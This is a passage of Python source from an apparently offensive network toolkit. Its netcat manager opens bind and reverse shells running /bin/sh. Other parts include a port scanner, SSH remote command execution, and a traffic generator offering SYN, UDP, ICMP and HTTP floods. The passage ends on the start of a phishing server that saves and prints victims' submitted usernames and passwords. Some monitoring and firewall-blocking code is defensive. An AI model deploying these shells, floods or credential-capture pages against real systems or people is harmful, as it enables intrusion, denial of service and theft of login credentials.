                if options.get('keep_alive'):
                    cmd.append('-k')
            elif mode == 'bind_shell':
                cmd.extend(['-l', '-p', str(port), '-e', options.get('shell', '/bin/sh')])
            elif mode == 'reverse_shell':
                target = options.get('target')
                if not target:
                    return {'success': False, 'error': 'Target required for reverse shell'}
                cmd.extend([target, str(port), '-e', options.get('shell', '/bin/sh')])
            elif mode == 'transfer':
                if options.get('send'):
                    cmd.extend(['-w', '3', options.get('target'), str(port)])
                else:
                    cmd.extend(['-l', '-p', str(port), '>', options.get('output', 'received_file')])
            else:
                cmd.extend(['-l', '-p', str(port)])
            
            self.db.add_netcat_listener(listener_id, port, mode)
            
            thread = threading.Thread(
                target=self._run_listener,
                args=(listener_id, cmd, port, mode, stop_event, options)
            )
            thread.daemon = True
            thread.start()
            
            self.active_listeners[listener_id] = {
                'id': listener_id,
                'port': port,
                'mode': mode,
                'cmd': ' '.join(cmd),
                'thread': thread,
                'options': options
            }
            self.listener_threads[listener_id] = thread
            
            logger.info(f"Netcat listener started: {listener_id} on port {port} ({mode})")
            
            return {
                'success': True,
                'listener_id': listener_id,
                'port': port,
                'mode': mode,
                'command': ' '.join(cmd),
                'message': f"Netcat listener started on port {port}"
            }
            
        except Exception as e:
            logger.error(f"Failed to create netcat listener: {e}")
            return {'success': False, 'error': str(e)}
    
    def _run_listener(self, listener_id: str, cmd: List[str], port: int, mode: str,
                     stop_event: threading.Event, options: Dict):
        """Run netcat listener in thread"""
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            self.active_listeners[listener_id]['pid'] = process.pid
            
            while not stop_event.is_set():
                if process.poll() is not None:
                    break
                
                if process.stdout:
                    line = process.stdout.readline()
                    if line:
                        self.db.update_netcat_listener(listener_id, connections=1)
                        
                        ip_match = re.search(r'\d+\.\d+\.\d+\.\d+', line)
                        if ip_match:
                            remote_ip = ip_match.group()
                            self.db.add_netcat_connection(
                                listener_id,
                                remote_ip,
                                port,
                                data_size=len(line)
                            )
                            
                            if options.get('log_traffic'):
                                log_file = os.path.join(NETCAT_LISTENERS_DIR, f"{listener_id}.log")
                                with open(log_file, 'a') as f:
                                    f.write(f"[{datetime.datetime.now()}] Connection from {remote_ip}\n")
                                    f.write(line)
                
                time.sleep(0.1)
            
            if process.poll() is None:
                process.terminate()
                time.sleep(1)
                if process.poll() is None:
                    process.kill()
            
            self.db.update_netcat_listener(listener_id, status='stopped')
            
        except Exception as e:
            logger.error(f"Netcat listener error: {e}")
            self.db.update_netcat_listener(listener_id, status='error')
    
    def stop_listener(self, listener_id: str = None) -> bool:
        """Stop netcat listener(s)"""
        if listener_id:
            if listener_id in self.stop_events:
                self.stop_events[listener_id].set()
                if listener_id in self.active_listeners:
                    del self.active_listeners[listener_id]
                if listener_id in self.listener_threads:
                    del self.listener_threads[listener_id]
                if listener_id in self.stop_events:
                    del self.stop_events[listener_id]
                return True
        else:
            for lid in list(self.stop_events.keys()):
                self.stop_events[lid].set()
            self.active_listeners.clear()
            self.listener_threads.clear()
            self.stop_events.clear()
            return True
        
        return False
    
    def get_listeners(self) -> List[Dict]:
        """Get active listeners"""
        db_listeners = self.db.get_netcat_listeners(active_only=True)
        
        for listener in db_listeners:
            lid = listener['id']
            if lid in self.active_listeners:
                listener['active'] = True
                listener['cmd'] = self.active_listeners[lid].get('cmd')
            else:
                listener['active'] = False
        
        return db_listeners
    
    def connect(self, target: str, port: int, timeout: int = 30) -> Dict[str, Any]:
        """Connect to a netcat listener"""
        if not self.check_netcat():
            return {'success': False, 'error': 'Netcat not installed'}
        
        try:
            nc_path = self.get_netcat_path()
            cmd = [nc_path, '-nv', target, str(port), '-w', str(timeout)]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout + 5,
                encoding='utf-8'
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'returncode': result.returncode
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def port_scan(self, target: str, ports: str = "1-1000", timeout: int = 1) -> Dict[str, Any]:
        """Port scan using netcat"""
        open_ports = []
        
        if '-' in ports:
            start, end = map(int, ports.split('-'))
            port_list = list(range(start, end + 1))
        elif ',' in ports:
            port_list = [int(p) for p in ports.split(',')]
        else:
            port_list = [int(ports)]
        
        for port in port_list:
            try:
                nc_path = self.get_netcat_path()
                cmd = [nc_path, '-zv', '-w', str(timeout), target, str(port)]
                
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout + 1
                )
                
                if result.returncode == 0 or "open" in result.stderr.lower():
                    open_ports.append(port)
            except:
                pass
        
        return {
            'success': True,
            'target': target,
            'scanned_ports': len(port_list),
            'open_ports': open_ports,
            'open_count': len(open_ports)
        }
    
    def reverse_shell(self, lhost: str, lport: int, shell: str = '/bin/sh') -> Dict[str, Any]:
        """Create a reverse shell using netcat"""
        return self.create_listener(
            port=lport,
            mode='reverse_shell',
            options={'target': lhost, 'shell': shell}
        )
    
    def bind_shell(self, port: int, shell: str = '/bin/sh') -> Dict[str, Any]:
        """Create a bind shell using netcat"""
        return self.create_listener(
            port=port,
            mode='bind_shell',
            options={'shell': shell}
        )

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager for remote command execution"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.connections = {}
        self.shells = {}
        self.lock = threading.Lock()
        self.max_connections = self.config.get('ssh', {}).get('max_connections', 5)
        self.default_timeout = self.config.get('ssh', {}).get('default_timeout', 30)
        self.keep_alive = self.config.get('ssh', {}).get('keep_alive', 60)
    
    def add_server(self, name: str, host: str, username: str, password: str = None,
                  key_file: str = None, port: int = 22, notes: str = "") -> Dict[str, Any]:
        """Add a new SSH server configuration"""
        try:
            server_id = str(uuid.uuid4())[:8]
            
            if key_file and not os.path.exists(key_file):
                return {'success': False, 'error': f'Key file not found: {key_file}'}
            
            server = SSHServer(
                id=server_id,
                name=name,
                host=host,
                port=port,
                username=username,
                password=password,
                key_file=key_file,
                use_key=key_file is not None,
                timeout=self.default_timeout,
                notes=notes,
                created_at=datetime.datetime.now().isoformat()
            )
            
            if self.db.add_ssh_server(server):
                return {
                    'success': True,
                    'server_id': server_id,
                    'message': f'Server {name} added successfully'
                }
            else:
                return {'success': False, 'error': 'Failed to add server to database'}
                
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return {'success': False, 'error': str(e)}
    
    def connect(self, server_id: str) -> Dict[str, Any]:
        """Establish SSH connection to server"""
        with self.lock:
            if not PARAMIKO_AVAILABLE:
                return {'success': False, 'error': 'Paramiko not installed'}
            
            if server_id in self.connections:
                return {'success': True, 'message': 'Already connected'}
            
            if len(self.connections) >= self.max_connections:
                return {'success': False, 'error': f'Max connections ({self.max_connections}) reached'}
            
            server = self.db.get_ssh_server(server_id)
            if not server:
                return {'success': False, 'error': f'Server {server_id} not found'}
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                connect_kwargs = {
                    'hostname': server['host'],
                    'port': server['port'],
                    'username': server['username'],
                    'timeout': server.get('timeout', self.default_timeout)
                }
                
                if server.get('use_key') and server.get('key_file'):
                    key = paramiko.RSAKey.from_private_key_file(server['key_file'])
                    connect_kwargs['pkey'] = key
                elif server.get('password'):
                    connect_kwargs['password'] = server['password']
                else:
                    return {'success': False, 'error': 'No authentication method available'}
                
                client.connect(**connect_kwargs)
                
                session_id = self.db.start_ssh_session(server_id)
                
                self.connections[server_id] = (client, session_id)
                
                self.db.update_ssh_server_status(server_id, 'connected')
                
                return {
                    'success': True,
                    'message': f'Connected to {server["name"]} ({server["host"]})',
                    'server': server
                }
                
            except Exception as e:
                return {'success': False, 'error': str(e)}
    
    def disconnect(self, server_id: str = None):
        """Disconnect SSH session(s)"""
        with self.lock:
            if server_id:
                if server_id in self.connections:
                    client, session_id = self.connections[server_id]
                    try:
                        client.close()
                    except:
                        pass
                    
                    self.db.end_ssh_session(session_id, 0)
                    self.db.update_ssh_server_status(server_id, 'disconnected')
                    
                    del self.connections[server_id]
                    
                    if server_id in self.shells:
                        channel, shell_session = self.shells[server_id]
                        try:
                            channel.close()
                        except:
                            pass
                        del self.shells[server_id]
            else:
                for sid in list(self.connections.keys()):
                    self.disconnect(sid)
    
    def execute_command(self, server_id: str, command: str, timeout: int = None,
                       executed_by: str = "system") -> SSHCommandResult:
        """Execute command on remote server via SSH"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return SSHCommandResult(
                    success=False,
                    output='',
                    error=connect_result.get('error', 'Connection failed'),
                    execution_time=time.time() - start_time,
                    server=server_id,
                    command=command
                )
        
        client, session_id = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        
        try:
            stdin, stdout, stderr = client.exec_command(
                command,
                timeout=timeout or self.default_timeout
            )
            
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            
            execution_time = time.time() - start_time
            
            result = SSHCommandResult(
                success=len(error) == 0,
                output=output,
                error=error if error else None,
                execution_time=execution_time,
                server=server_name,
                command=command
            )
            
            self.db.log_ssh_command(
                server_id=server_id,
                server_name=server_name,
                command=command,
                success=result.success,
                output=output,
                error=error if error else None,
                execution_time=execution_time,
                executed_by=executed_by
            )
            
            self.db.cursor.execute('''
                UPDATE ssh_sessions 
                SET commands_count = commands_count + 1
                WHERE id = ?
            ''', (session_id,))
            self.db.conn.commit()
            
            return result
            
        except Exception as e:
            self.disconnect(server_id)
            return SSHCommandResult(
                success=False,
                output='',
                error=str(e),
                execution_time=time.time() - start_time,
                server=server_name,
                command=command
            )
    
    def get_servers(self) -> List[Dict]:
        """Get all configured servers with status"""
        servers = self.db.get_ssh_servers()
        
        for server in servers:
            server_id = server['id']
            server['connected'] = server_id in self.connections
            server['shell_active'] = server_id in self.shells
            
        return servers

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    """Real network traffic generator using Scapy and sockets"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.generator_threads = {}
        self.stop_events = {}
        
        self.traffic_types = {
            TrafficType.ICMP: "ICMP echo requests (ping)",
            TrafficType.TCP_SYN: "TCP SYN packets (half-open)",
            TrafficType.TCP_ACK: "TCP ACK packets",
            TrafficType.TCP_CONNECT: "Full TCP connections",
            TrafficType.UDP: "UDP packets",
            TrafficType.HTTP_GET: "HTTP GET requests",
            TrafficType.HTTP_POST: "HTTP POST requests",
            TrafficType.HTTPS: "HTTPS requests",
            TrafficType.DNS: "DNS queries",
            TrafficType.ARP: "ARP requests",
            TrafficType.PING_FLOOD: "ICMP flood",
            TrafficType.SYN_FLOOD: "SYN flood",
            TrafficType.UDP_FLOOD: "UDP flood",
            TrafficType.HTTP_FLOOD: "HTTP flood",
            TrafficType.MIXED: "Mixed traffic types",
            TrafficType.RANDOM: "Random traffic patterns"
        }
        
        self.has_raw_socket_permission = self._check_raw_socket_permission()
    
    def _check_raw_socket_permission(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except PermissionError:
            return False
        except Exception:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        available = []
        
        available.extend([
            TrafficType.TCP_CONNECT,
            TrafficType.HTTP_GET,
            TrafficType.HTTP_POST,
            TrafficType.HTTPS,
            TrafficType.DNS
        ])
        
        if self.scapy_available and self.has_raw_socket_permission:
            available.extend([
                TrafficType.ICMP,
                TrafficType.TCP_SYN,
                TrafficType.TCP_ACK,
                TrafficType.UDP,
                TrafficType.ARP,
                TrafficType.PING_FLOOD,
                TrafficType.SYN_FLOOD,
                TrafficType.UDP_FLOOD,
                TrafficType.HTTP_FLOOD,
                TrafficType.MIXED,
                TrafficType.RANDOM
            ])
        
        return available
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int, 
                        port: int = None, packet_rate: int = 100, 
                        executed_by: str = "system") -> TrafficGenerator:
        
        if traffic_type not in self.traffic_types:
            raise ValueError(f"Invalid traffic type. Available: {list(self.traffic_types.keys())}")
        
        max_duration = self.config.get('traffic_generation', {}).get('max_duration', 300)
        if duration > max_duration:
            raise ValueError(f"Duration exceeds maximum allowed ({max_duration} seconds)")
        
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP address: {target_ip}")
        
        if port is None:
            if traffic_type in [TrafficType.HTTP_GET, TrafficType.HTTP_POST, TrafficType.HTTP_FLOOD]:
                port = 80
            elif traffic_type == TrafficType.HTTPS:
                port = 443
            elif traffic_type == TrafficType.DNS:
                port = 53
            else:
                port = 0
        
        generator = TrafficGenerator(
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_traffic_generator,
            args=(generator_id, generator, packet_rate, stop_event)
        )
        thread.daemon = True
        thread.start()
        
        self.generator_threads[generator_id] = thread
        self.active_generators[generator_id] = generator
        
        return generator
    
    def _run_traffic_generator(self, generator_id: str, generator: TrafficGenerator, 
                               packet_rate: int, stop_event: threading.Event):
        try:
            start_time = time.time()
            end_time = start_time + generator.duration
            packets_sent = 0
            bytes_sent = 0
            packet_interval = 1.0 / max(1, packet_rate)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    if generator.traffic_type == TrafficType.ICMP:
                        size = self._generate_icmp(generator.target_ip)
                    elif generator.traffic_type == TrafficType.TCP_SYN:
                        size = self._generate_tcp_syn(generator.target_ip, generator.target_port)
                    elif generator.traffic_type == TrafficType.TCP_ACK:
                        size = self._generate_tcp_ack(generator.target_ip, generator.target_port)
                    elif generator.traffic_type == TrafficType.TCP_CONNECT:
                        size = self._generate_tcp_connect(generator.target_ip, generator.target_port)
                    elif generator.traffic_type == TrafficType.UDP:
                        size = self._generate_udp(generator.target_ip, generator.target_port)
                    elif generator.traffic_type == TrafficType.HTTP_GET:
                        size = self._generate_http_get(generator.target_ip, generator.target_port)
                    elif generator.traffic_type == TrafficType.HTTP_POST:
                        size = self._generate_http_post(generator.target_ip, generator.target_port)
                    elif generator.traffic_type == TrafficType.HTTPS:
                        size = self._generate_https(generator.target_ip, generator.target_port)
                    elif generator.traffic_type == TrafficType.DNS:
                        size = self._generate_dns(generator.target_ip, generator.target_port)
                    elif generator.traffic_type == TrafficType.ARP:
                        size = self._generate_arp(generator.target_ip)
                    else:
                        size = self._generate_icmp(generator.target_ip)
                    
                    if size > 0:
                        packets_sent += 1
                        bytes_sent += size
                    
                    time.sleep(packet_interval)
                except Exception as e:
                    time.sleep(0.1)
            
            generator.packets_sent = packets_sent
            generator.bytes_sent = bytes_sent
            generator.end_time = datetime.datetime.now().isoformat()
            generator.status = "completed"
            
            self.db.log_traffic(generator)
            
        except Exception as e:
            generator.status = "failed"
            generator.error = str(e)
            self.db.log_traffic(generator)
        finally:
            if generator_id in self.active_generators:
                del self.active_generators[generator_id]
            if generator_id in self.stop_events:
                del self.stop_events[generator_id]
    
    def _generate_icmp(self, target_ip: str) -> int:
        if not self.scapy_available:
            return self._generate_ping_socket(target_ip)
        try:
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_ping_socket(self, target_ip: str) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(0, 65535)
            payload = b"3AMOWL Traffic Test"
            header = struct.pack("!BBHHH", 8, 0, 0, packet_id, 1)
            packet = header + payload
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A")
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: 3AMOWL\r\n\r\n"
            sock.send(data.encode())
            sock.close()
            return len(data) + 40
        except:
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"3AMOWL UDP Test" + os.urandom(32)
            sock.sendto(data, (target_ip, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "3AMOWL"})
            conn.getresponse()
            conn.close()
            return 100
        except:
            return 0
    
    def _generate_http_post(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("POST", "/", body="test=3amowl", headers={"User-Agent": "3AMOWL"})
            conn.getresponse()
            conn.close()
            return 100
        except:
            return 0
    
    def _generate_https(self, target_ip: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "3AMOWL"})
            conn.getresponse()
            conn.close()
            return 200
        except:
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            dns_query = transaction_id + flags + questions + b'\x00\x00'*3 + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except:
            return 0
    
    def _generate_arp(self, target_ip: str) -> int:
        if not self.scapy_available:
            return 0
        try:
            packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def stop_generation(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_generators(self) -> List[Dict]:
        active = []
        for gen_id, generator in self.active_generators.items():
            active.append({
                "id": gen_id,
                "target_ip": generator.target_ip,
                "traffic_type": generator.traffic_type,
                "duration": generator.duration,
                "start_time": generator.start_time,
                "packets_sent": generator.packets_sent,
                "bytes_sent": generator.bytes_sent
            })
        return active

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    """Nikto web vulnerability scanner integration"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.nikto_available = self._check_nikto()
    
    def _check_nikto(self) -> bool:
        nikto_path = shutil.which('nikto')
        if nikto_path:
            return True
        common_paths = ['/usr/bin/nikto', '/usr/local/bin/nikto', '/opt/nikto/nikto.pl']
        for path in common_paths:
            if os.path.exists(path):
                return True
        return False
    
    def scan(self, target: str, options: Dict = None) -> NiktoResult:
        start_time = time.time()
        options = options or {}
        
        if not self.nikto_available:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=0,
                output_file="",
                success=False,
                error="Nikto is not installed"
            )
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            nikto_cmd = self._get_nikto_command()
            cmd = [nikto_cmd, '-host', target, '-Format', 'json', '-o', output_file]
            
            if target.startswith('https://') or options.get('ssl'):
                cmd.append('-ssl')
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=options.get('timeout', 600))
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_nikto_output(result.stdout, output_file)
            
            nikto_result = NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=vulnerabilities,
                scan_time=scan_time,
                output_file=output_file,
                success=result.returncode == 0
            )
            self.db.log_nikto_scan(nikto_result)
            return nikto_result
            
        except Exception as e:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=time.time() - start_time,
                output_file="",
                success=False,
                error=str(e)
            )
    
    def _get_nikto_command(self) -> str:
        nikto_path = shutil.which('nikto')
        if nikto_path:
            return nikto_path
        common_paths = ['/usr/bin/nikto', '/usr/local/bin/nikto', '/opt/nikto/nikto.pl']
        for path in common_paths:
            if os.path.exists(path):
                return path
        return 'nikto'
    
    def _parse_nikto_output(self, output: str, json_file: str) -> List[Dict]:
        vulnerabilities = []
        if os.path.exists(json_file):
            try:
                with open(json_file, 'r') as f:
                    data = json.load(f)
                    if 'vulnerabilities' in data:
                        vulnerabilities = data['vulnerabilities']
            except:
                pass
        if not vulnerabilities:
            for line in output.split('\n'):
                if '+ ' in line or 'OSVDB' in line or 'CVE' in line:
                    vulnerabilities.append({'description': line.strip(), 'severity': 'medium'})
        return vulnerabilities
    
    def get_available_scan_types(self) -> List[str]:
        return ["full", "ssl", "cgi", "sql", "xss"]

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Comprehensive network tools"""
    
    @staticmethod
    def ping(target: str, count: int = 4) -> Dict[str, Any]:
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return {'success': result.returncode == 0, 'output': result.stdout + result.stderr}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def traceroute(target: str) -> Dict[str, Any]:
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                cmd = ['traceroute', '-n', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return {'success': True, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def nmap_scan(target: str, scan_type: str = "quick") -> Dict[str, Any]:
        try:
            if scan_type == "quick":
                cmd = ['nmap', '-T4', '-F', target]
            elif scan_type == "full":
                cmd = ['nmap', '-p-', '-T4', target]
            else:
                cmd = ['nmap', '-sV', '-sC', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return {'success': True, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def whois_lookup(domain: str) -> Dict[str, Any]:
        if not WHOIS_AVAILABLE:
            return {'success': False, 'output': 'WHOIS not available'}
        try:
            import whois
            result = whois.whois(domain)
            return {'success': True, 'output': str(result)}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict[str, Any]:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {'success': True, 'country': data.get('country'), 'city': data.get('city'), 'isp': data.get('isp')}
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def shorten_url(url: str) -> str:
        if not SHORTENER_AVAILABLE:
            return url
        try:
            import pyshorteners
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except:
            return url
    
    @staticmethod
    def generate_qr_code(url: str, filename: str) -> bool:
        if not QRCODE_AVAILABLE:
            return False
        try:
            import qrcode
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filename)
            return True
        except:
            return False

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    """Network monitoring and threat detection"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.monitoring = False
        self.monitored_ips = set()
        self.thresholds = {
            'port_scan': self.config.get('monitoring', {}).get('port_scan_threshold', 10)
        }
        self.threads = []
        self.auto_block = self.config.get('security', {}).get('auto_block', False)
        self.auto_block_threshold = self.config.get('security', {}).get('auto_block_threshold', 5)
        self.connection_tracker = {}
    
    def start_monitoring(self):
        if self.monitoring:
            return
        self.monitoring = True
        logger.info("Starting network monitoring...")
        
        managed = self.db.get_managed_ips()
        self.monitored_ips = {ip['ip_address'] for ip in managed if not ip.get('is_blocked', False)}
        
        self.threads = [
            threading.Thread(target=self._monitor_threats, daemon=True)
        ]
        for thread in self.threads:
            thread.start()
        logger.info("Network monitoring started")
    
    def stop_monitoring(self):
        self.monitoring = False
        for thread in self.threads:
            thread.join(timeout=2)
        self.threads = []
        logger.info("Network monitoring stopped")
    
    def _monitor_threats(self):
        while self.monitoring:
            try:
                connections = psutil.net_connections()
                source_counts = {}
                for conn in connections:
                    if conn.raddr:
                        source_ip = conn.raddr.ip
                        source_counts[source_ip] = source_counts.get(source_ip, 0) + 1
                        if source_ip not in self.connection_tracker:
                            self.connection_tracker[source_ip] = []
                        self.connection_tracker[source_ip].append(time.time())
                
                for source_ip, count in source_counts.items():
                    if count > self.thresholds['port_scan']:
                        self._create_threat_alert(
                            threat_type="Possible Port Scan",
                            source_ip=source_ip,
                            severity="medium",
                            description=f"{count} connections",
                            action_taken="Monitoring"
                        )
                        if self.auto_block:
                            alert_count = len(self.connection_tracker.get(source_ip, []))
                            if alert_count > self.auto_block_threshold:
                                self._auto_block_ip(source_ip, "Port scan threshold exceeded")
                
                time.sleep(30)
            except Exception as e:
                time.sleep(10)
    
    def _create_threat_alert(self, threat_type: str, source_ip: str, severity: str, description: str, action_taken: str):
        alert = ThreatAlert(
            timestamp=datetime.datetime.now().isoformat(),
            threat_type=threat_type,
            source_ip=source_ip,
            severity=severity,
            description=description,
            action_taken=action_taken
        )
        self.db.log_threat(alert)
    
    def _auto_block_ip(self, ip: str, reason: str):
        if NetworkTools.block_ip_firewall(ip):
            self.db.block_ip(ip, reason, executed_by="auto_block")
    
    def add_ip_to_monitoring(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.monitored_ips.add(ip)
            return self.db.add_managed_ip(ip, added_by, notes)
        except:
            return False
    
    def remove_ip_from_monitoring(self, ip: str) -> bool:
        if ip in self.monitored_ips:
            self.monitored_ips.remove(ip)
        return self.db.remove_managed_ip(ip)
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        firewall_success = NetworkTools.block_ip_firewall(ip)
        db_success = self.db.block_ip(ip, reason, executed_by)
        if ip in self.monitored_ips:
            self.monitored_ips.remove(ip)
        return firewall_success or db_success
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        firewall_success = NetworkTools.unblock_ip_firewall(ip)
        db_success = self.db.unblock_ip(ip, executed_by)
        return firewall_success or db_success
    
    def get_status(self) -> Dict[str, Any]:
        stats = self.db.get_statistics()
        return {
            'monitoring': self.monitoring,
            'monitored_ips_count': len(self.monitored_ips),
            'blocked_ips': stats.get('total_blocked_ips', 0),
            'auto_block': self.auto_block
        }

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        try:
            if self.path == '/':
                self.send_phishing_page()
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            logger.error(f"Error: {e}")
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            
            username = form_data.get('email', form_data.get('username', ['']))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_captured_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent, ""
                )
                print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"  IP: {client_ip}")
                print(f"  Username: {username}")
                print(f"  Password: {password}")
            
